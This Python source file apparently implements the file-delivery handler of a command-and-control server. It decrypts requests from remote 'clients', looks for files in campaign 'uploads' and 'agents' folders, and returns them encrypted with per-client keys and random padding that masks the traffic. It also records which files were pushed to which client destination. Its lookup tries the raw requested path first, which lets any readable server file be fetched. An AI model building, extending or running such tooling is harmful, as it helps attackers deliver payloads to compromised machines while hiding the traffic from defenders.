import os
import base64
import json
import logging
import random
import string
import datetime
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class FileDownloadHandler(BaseHandler):
    """Handler for file download requests from clients (server sends, client downloads)"""
    
    def handle(self):
        """Process file download request from client (server sends, client downloads)"""
        try:
            # Log request path for debugging
            logger.info(f"File download request received on path: {self.request_handler.path}")
            
            # Get the operation payload
            payload = self.get_operation_payload()
            
            # Store the original request body position
            original_position = None
            if hasattr(self.request_handler, 'rfile'):
                try:
                    original_position = self.request_handler.rfile.tell()
                except:
                    pass
            
            if payload:
                # Modern approach - operation payload from OperationRouter
                try:
                    # Debug log
                    if isinstance(payload, dict):
                        logger.debug(f"Processing file download with payload keys: {', '.join(payload.keys())}")
                    else:
                        logger.debug(f"Processing file download with payload type: {type(payload)}")
                    
                    # Check if we have FilePath in the payload
                    if isinstance(payload, dict) and "FilePath" in payload:
                        # Identify client from the request
                        client_id = None
                        
                        if hasattr(self.request_handler, 'client_id'):
                            client_id = self.request_handler.client_id
                        
                        if not client_id:
                            # If we don't have the client ID, try to get it from the client address
                            client_id = self._identify_client_by_ip()
                            logger.info(f"Identified client by IP: {client_id}")
                        
                        # Process the file request
                        response = self._process_file_request(client_id, payload)
                        
                        # Convert response to JSON and encrypt
                        response_json = json.dumps(response)
                        logger.debug(f"File response before encryption: {response_json[:100]}...")
                        
                        # IMPORTANT: encrypt with client key
                        encrypted_response = ""
                        if client_id:
                            try:
                                encrypted_response = self.crypto_helper.encrypt(response_json, client_id)
                                logger.debug(f"Encrypted response with client-specific key")
                            except Exception as e:
                                logger.error(f"Failed to encrypt with client key: {e}, falling back to campaign key")
                                encrypted_response = self.crypto_helper.encrypt(response_json)
                        else:
                            encrypted_response = self.crypto_helper.encrypt(response_json)
                            logger.debug(f"Encrypted response with campaign key (no client ID)")
                        
                        # Add token padding
                        token_padding = self._generate_token_padding()
                        
                        # Prepare final response - ENSURE this uses the 'd' field expected by client
                        final_response = {
                            "d": encrypted_response,
                            "t": token_padding
                        }
                        
                        # Log the final response structure
                        logger.debug(f"Sending file response with keys: {', '.join(final_response.keys())}")
                        
                        # Send the response
                        final_json = json.dumps(final_response)
                        self.send_response(200, "application/json", final_json)
                        logger.info(f"File download response sent successfully")
                    else:
                        logger.error(f"Invalid file download payload format: missing FilePath")
                        self._send_error_json("Invalid payload format - missing FilePath")
                except Exception as e:
                    logger.error(f"Error processing file download payload: {e}")
                    self._send_error_json(f"Server error: {str(e)}")
            else:
                # Legacy approach - parse from request body
                # Reset file position if we were able to store it
                if original_position is not None and hasattr(self.request_handler, 'rfile'):
                    try:
                        self.request_handler.rfile.seek(original_position)
                    except:
                        logger.warning("Could not reset request body position")
                
                # Get content data
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length == 0:
                    self._send_error_json("Missing content")
                    return
                    
                request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
                logger.debug(f"Raw request body: {request_body[:100]}...")
                
                try:
                    # Parse the JSON request
                    request_json = json.loads(request_body)
                    encrypted_data = request_json.get('d') or request_json.get('data')
                    
                    # Extract token padding (if present - discard it since we don't need it)
                    token = request_json.get('t', '') or request_json.get('token', '')
                    if token:
                        logger.debug(f"Request includes token padding: {len(token)} bytes")
                    
                    # Verify presence of encrypted data
                    if not encrypted_data:
                        self._send_error_json("Missing encrypted data field")
                        return
                    
                    # Identify client by key-based decryption
                    client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
                    
                    # If client identification failed but client_id was provided in request
                    if client_id is None:
                        provided_client_id = request_json.get('c') or request_json.get('client_id') or request_json.get('id')
                        
                        if provided_client_id:
                            # Try decryption using the provided client ID
                            try:
                                decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
                                client_id = provided_client_id
                                logger.info(f"Successfully used provided client ID: {client_id}")
                            except Exception as e:
                                logger.error(f"Failed to decrypt using provided client ID: {e}")
                    
                    if client_id is None or decrypted_data is None:
                        self._send_error_json("Authentication failed - could not decrypt data")
                        return
                        
                    # Process the file request
                    response = self._process_file_request(client_id, decrypted_data)
                    
                    # Encrypt the response WITH CLIENT KEY - this is crucial
                    response_json = json.dumps(response)
                    logger.debug(f"Response before encryption: {response_json[:100]}...")
                    
                    encrypted_response = self.crypto_helper.encrypt(response_json, client_id)
                    logger.debug(f"Encrypted response with client key")
                    
                    # Add token padding
                    token_padding = self._generate_token_padding()
                    
                    # IMPORTANT: Prepare final response WITH 'd' field
                    final_response = {
                        "d": encrypted_response,
                        "t": token_padding
                    }
                    
                    # Log the final response structure
                    logger.debug(f"Sending final response with keys: {', '.join(final_response.keys())}")
                    
                    # Send the encrypted response
                    final_json = json.dumps(final_response)
                    self.send_response(200, "application/json", final_json)
                    logger.info(f"File download response sent successfully via JSON format")
                    
                except json.JSONDecodeError as e:
                    logger.error(f"JSON decode error: {e} - Request body: {request_body[:100]}...")
                    self._send_error_json(f"Invalid JSON format: {str(e)}")
                except Exception as e:
                    logger.error(f"Error handling file download request: {e}")
                    self._send_error_json(f"Server error: {str(e)}")
        except Exception as e:
            logger.error(f"Critical error in file download handler: {e}")
            self._send_error_json("Critical server error")
    
    def _send_error_json(self, error_message):
        """Helper to consistently send error responses in proper JSON format"""
        error_response = {
            "Status": "Error",
            "Message": error_message
        }
        
        try:
            # Use campaign key as fallback since we may not have client ID
            response_json = json.dumps(error_response)
            encrypted_error = self.crypto_helper.encrypt(response_json)
            token_padding = self._generate_token_padding()
            
            # IMPORTANT: Construct the response WITH 'd' field that client expects
            final_response = {
                "d": encrypted_error,
                "t": token_padding
            }
            
            # Log what we're sending
            logger.debug(f"Sending error response with keys: {', '.join(final_response.keys())}")
            
            # Convert to JSON and send
            final_json = json.dumps(final_response)
            self.request_handler.send_response(200)
            self.request_handler.send_header("Content-type", "application/json")
            self.request_handler.end_headers()
            self.request_handler.wfile.write(final_json.encode("utf-8"))
        except Exception as e:
            logger.error(f"Error sending error response: {e}")
            # Ultra-fallback with hardcoded response
            fallback = json.dumps({"d": "RXJyb3I=", "t": "fallback"})
            self.request_handler.send_response(200)
            self.request_handler.send_header("Content-type", "application/json")
            self.request_handler.end_headers()
            self.request_handler.wfile.write(fallback.encode("utf-8"))
    
    def _process_file_request(self, client_id, file_request_json):
        """
        Process a client's request to download a file from the server
        
        Args:
            client_id: The client ID
            file_request_json: JSON string containing the file request information
            
        Returns:
            Dictionary with file response information
        """
        try:
            # Parse the file request with proper error handling
            if isinstance(file_request_json, str):
                try:
                    file_request = json.loads(file_request_json)
                except json.JSONDecodeError as e:
                    logger.error(f"Error parsing JSON request: {e}, content: {file_request_json[:100]}...")
                    return {
                        "Status": "Error",
                        "Message": f"Invalid JSON format: {str(e)}"
                    }
            else:
                # Already parsed JSON
                file_request = file_request_json
            
            file_path = file_request.get('FilePath')
            destination = file_request.get('Destination')
            
            if not file_path:
                return {
                    "Status": "Error",
                    "Message": "No file path specified"
                }
            
            # Log the request
            logger.info(f"File request from client {client_id or self.client_address[0]}: {file_path}")
            logger.info(f"Destination on client: {destination}")
            
            if client_id:
                self.client_manager.log_event(client_id, "File Request", f"Client requested server file: {file_path}")
            
            # Determine the file path in the campaign folders
            campaign_folder = self.get_campaign_folder()
            uploads_folder = os.path.join(campaign_folder, "uploads")     # Primary location for files served TO clients 
            downloads_folder = os.path.join(campaign_folder, "downloads") # Files received FROM clients
            
            # Look for the file in several possible locations with proper priority order
            possible_locations = [
                file_path,  # Direct path
                os.path.join(uploads_folder, file_path),  # In uploads folder - look here FIRST
                os.path.join(campaign_folder, "agents", file_path),  # In agents folder
                os.path.join(campaign_folder, file_path),  # In campaign folder
                os.path.join(downloads_folder, file_path),  # In downloads folder - look here LAST
            ]
            
            # If client_id is available, also check in client-specific folders
            if client_id:
                possible_locations.append(os.path.join(uploads_folder, client_id, file_path))
                
                # Try with just the filename in the client folders
                filename = os.path.basename(file_path)
                possible_locations.append(os.path.join(uploads_folder, client_id, filename))
                possible_locations.append(os.path.join(campaign_folder, "agents", filename))
                # Log the locations we're checking
            logger.debug(f"Looking for file {file_path} in these locations: {possible_locations}")
            
            # Try each location
            actual_path = None
            for path in possible_locations:
                logger.debug(f"Checking path: {path}")
                if os.path.exists(path) and os.path.isfile(path):
                    actual_path = path
                    logger.info(f"File found at: {path}")
                    break
            
            if not actual_path:
                logger.warning(f"File not found in any of {len(possible_locations)} possible locations")
                return {
                    "Status": "Error", 
                    "Message": f"File not found: {file_path}"
                }
            
            # Read the file content as bytes and encode as Base64
            with open(actual_path, 'rb') as f:
                file_content = f.read()
            
            file_size = len(file_content)
            logger.debug(f"Found file at {actual_path}, size: {file_size} bytes")
            file_content_base64 = base64.b64encode(file_content).decode('utf-8')
            
            # Save a copy of the sent file to the uploads folder (server perspective)
            self._record_file_sent_to_client(client_id, actual_path, file_content, destination)
            
            # Log the successful file transmission
            logger.info(f"File {actual_path} ({file_size} bytes) sent to client {client_id or self.client_address[0]}")
            if client_id:
                self.client_manager.log_event(client_id, "File Sent", f"Server file {actual_path} ({file_size} bytes) sent to client destination: {destination}")
            
            # Create and return the response
            return {
                "Status": "Success",
                "FileName": os.path.basename(actual_path),
                "FileSize": file_size,
                "FileContent": file_content_base64
            }
            
        except json.JSONDecodeError as e:
            logger.error(f"Error parsing JSON in file request: {e}")
            return {
                "Status": "Error",
                "Message": f"Invalid file request format: {str(e)}"
            }
        except Exception as e:
            logger.error(f"Error processing file request: {e}")
            return {
                "Status": "Error",
                "Message": f"Error processing file request: {str(e)}"
            }

    def _record_file_sent_to_client(self, client_id, source_path, file_content, destination=None):
        """Record a copy of a file sent to client in the uploads folder"""
        if not client_id:
            return
            
        campaign_folder = self.get_campaign_folder()
        uploads_folder = os.path.join(campaign_folder, "uploads", client_id)
        os.makedirs(uploads_folder, exist_ok=True)
        
        # Create a filename that indicates this was sent to the client
        filename = f"sent_to_client_{os.path.basename(source_path)}"
        upload_path = os.path.join(uploads_folder, filename)
        
        try:
            # Save a copy of the file
            with open(upload_path, 'wb') as f:
                f.write(file_content)
                
            # Add a metadata file with additional information
            metadata_path = f"{upload_path}.meta"
            
            metadata = {
                "original_path": source_path,
                "client_destination": destination,
                "size_bytes": len(file_content),
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            with open(metadata_path, 'w') as f:
                json.dump(metadata, f, indent=2)
                
            logger.info(f"Recorded file sent to client {client_id} at {upload_path}")
        except Exception as e:
            logger.warning(f"Could not record file sent to client: {e}")